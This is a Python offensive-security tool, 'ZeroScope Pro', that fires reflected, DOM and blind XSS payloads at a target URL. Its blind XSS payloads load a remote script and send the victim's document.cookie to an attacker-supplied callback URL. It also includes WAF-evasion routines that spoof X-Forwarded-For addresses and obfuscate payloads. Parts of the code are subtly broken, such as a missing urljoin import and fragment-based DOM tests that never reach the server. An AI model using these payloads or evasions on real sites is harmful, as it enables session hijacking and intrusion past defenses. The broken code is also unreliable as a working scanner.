#!/usr/bin/env python3
"""
ZeroScope Pro - Advanced XSS Scanner with DOM/Reflected Detection
"""

import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import random
import time

class ZeroScope:
    def __init__(self):
        init()
        self.banner = f"""{Fore.CYAN}
███████╗███████╗██████╗ ░█████╗ ░██████╗░█████╗░░█████╗░██████╗░███████╗
╚════██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
░░███╔═╝█████╗░░██████╔╝██║░░██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝█████╗░░
██╔══╝░░██╔══╝░░██╔══██╗██║░░██║░╚═══██╗██║░░██╗██║░░██║██╔═══╝░██╔══╝░░
███████╗███████╗██║░░██║╚█████╔╝██████╔╝╚█████╔╝╚█████╔╝██║░░░░░███████╗
╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝
{Style.RESET_ALL}"""
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Zeroscope/2.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        self.vulnerabilities = []
        self.waf_detected = False

    def _random_ip(self):
        """Generate random IP for WAF evasion"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def _check_waf(self, url):
        """Detect if WAF is present"""
        test_payloads = [
            "' OR 1=1--",
            "<script>alert(1)</script>",
            "../../../etc/passwd"
        ]
        
        for payload in test_payloads:
            try:
                test_url = f"{url}?test={quote(payload)}"
                response = self.session.get(test_url, timeout=5)
                if response.status_code in [403, 406] or any(waf_word in response.text.lower() 
                   for waf_word in ['cloudflare', 'akamai', 'waf', 'security', 'forbidden']):
                    return True
            except:
                continue
        return False

    def _evade_waf(self, payload):
        """Apply WAF evasion techniques"""
        evasions = [
            lambda x: x.replace(' ', '/**/'),
            lambda x: x.replace('<', '%3C').replace('>', '%3E'),
            lambda x: x.upper(),
            lambda x: x.replace('script', 'scr\x00ipt')
        ]
        return random.choice(evasions)(payload)

    def test_dom_xss(self, url):
        """Test for DOM XSS vulnerabilities"""
        payloads = [
            ("#<script>alert('DOM_XSS')</script>", "DOM Injection", "High"),
            ("#javascript:alert('DOM_XSS')", "JS URI Injection", "High"),
            ("#'><img src=x onerror=alert('DOM_XSS')>", "DOM Breakout", "Medium"),
            ("#{\"x\":alert('DOM_XSS')}", "JSON Injection", "Medium")
        ]
        
        for payload, vuln_type, severity in payloads:
            test_url = f"{url}{payload}"
            try:
                response = self.session.get(test_url, timeout=5)
                if "DOM_XSS" in response.text or "alert(" in response.text:
                    self.vulnerabilities.append({
                        'url': test_url,
                        'type': f"DOM XSS ({vuln_type})",
                        'severity': severity,
                        'payload': payload
                    })
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error testing DOM XSS: {e}{Style.RESET_ALL}")

    def test_reflected_xss(self, url):
        """Test for reflected XSS in parameters"""
        payloads = [
            ("<script>alert('XSS')</script>", "Basic Script Tag", "Critical"),
            ("\" onmouseover=alert('XSS') ", "Event Handler", "High"),
            ("'><svg/onload=alert('XSS')>", "Tag Breakout", "High"),
            ("javascript:alert('XSS')", "JS URI", "Medium"),
            ("{{constructor.constructor('alert(1)')()}}", "Template Injection", "High")
        ]
        
        parsed = urlparse(url)
        
        # If URL has query parameters
        if parsed.query:
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
            for param in params:
                for payload, vuln_type, severity in payloads:
                    test_params = params.copy()
                    if self.waf_detected:
                        payload = self._evade_waf(payload)
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    
                    try:
                        response = self.session.get(test_url)
                        if payload in response.text:
                            self.vulnerabilities.append({
                                'url': test_url,
                                'type': f"Reflected XSS ({vuln_type})",
                                'severity': severity,
                                'payload': payload
                            })
                    except Exception as e:
                        print(f"{Fore.YELLOW}[!] Error testing {param}: {e}{Style.RESET_ALL}")
        else:
            # Test with default parameter if no query exists
            for payload, vuln_type, severity in payloads:
                if self.waf_detected:
                    payload = self._evade_waf(payload)
                test_url = f"{url}?test={quote(payload)}"
                try:
                    response = self.session.get(test_url)
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'url': test_url,
                            'type': f"Reflected XSS ({vuln_type})",
                            'severity': severity,
                            'payload': payload
                        })
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Error testing reflected XSS: {e}{Style.RESET_ALL}")

    def test_blind_xss(self, url, callback_url):
        """Test for blind XSS vulnerabilities"""
        payloads = [
            f"<script src='{callback_url}/xss.js'></script>",
            f"<img src=x onerror=\"fetch('{callback_url}/log?data='+btoa(document.cookie))\">",
            f"<iframe src='{callback_url}/iframe' onload=\"this.contentWindow.postMessage(document.cookie,'*')\">"
        ]
        
        for payload in payloads:
            try:
                # Test in URL parameters
                test_url = f"{url}?input={quote(payload)}"
                self.session.get(test_url)
                
                # Test in forms
                response = self.session.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                for form in soup.find_all('form'):
                    data = {}
                    for input_tag in form.find_all('input'):
                        name = input_tag.get('name')
                        if name:
                            data[name] = payload if input_tag.get('type') in ('text', 'search') else input_tag.get('value', '')
                    
                    if form.get('method', 'get').lower() == 'post':
                        self.session.post(urljoin(url, form.get('action')), data=data)
                    else:
                        self.session.get(urljoin(url, form.get('action')), params=data)
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Blind XSS test failed: {e}{Style.RESET_ALL}")

    def scan(self, url, blind_callback=None):
        """Main scanning function"""
        print(self.banner)
        print(f"{Fore.GREEN}[+] Testing: {url}{Style.RESET_ALL}")
        
        # Check for WAF
        self.waf_detected = self._check_waf(url)
        if self.waf_detected:
            print(f"{Fore.YELLOW}[!] WAF Detected - Applying evasion techniques{Style.RESET_ALL}")
            self.session.headers['X-Forwarded-For'] = self._random_ip()
        
        # Test all XSS types
        self.test_dom_xss(url)
        self.test_reflected_xss(url)
        
        if blind_callback:
            print(f"{Fore.CYAN}[*] Testing for Blind XSS with callback to {blind_callback}{Style.RESET_ALL}")
            self.test_blind_xss(url, blind_callback)
        
        self.report_results()

    def report_results(self):
        """Display scan results with type and severity"""
        print(f"\n{Fore.CYAN}=== Scan Results ==={Style.RESET_ALL}")
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[✓] No vulnerabilities found{Style.RESET_ALL}")
            return
            
        print(f"{Fore.RED}[!] Found {len(self.vulnerabilities)} vulnerabilities:{Style.RESET_ALL}")
        for i, vuln in enumerate(self.vulnerabilities, 1):
            severity_color = Fore.RED if vuln['severity'] in ['Critical','High'] else Fore.YELLOW
            print(f"\n{i}. {Fore.CYAN}{vuln['url']}{Style.RESET_ALL}")
            print(f"   {Fore.WHITE}Type: {vuln['type']}{Style.RESET_ALL}")
            print(f"   {severity_color}Severity: {vuln['severity']}{Style.RESET_ALL}")
            print(f"   Payload: {Fore.MAGENTA}{vuln['payload']}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='ZeroScope XSS Scanner')
    parser.add_argument('xss', help='XSS scanning mode')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('--blind', help='Callback URL for blind XSS')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    scanner = ZeroScope()
    scanner.scan(args.url, blind_callback=args.blind)

if __name__ == "__main__":
    main()
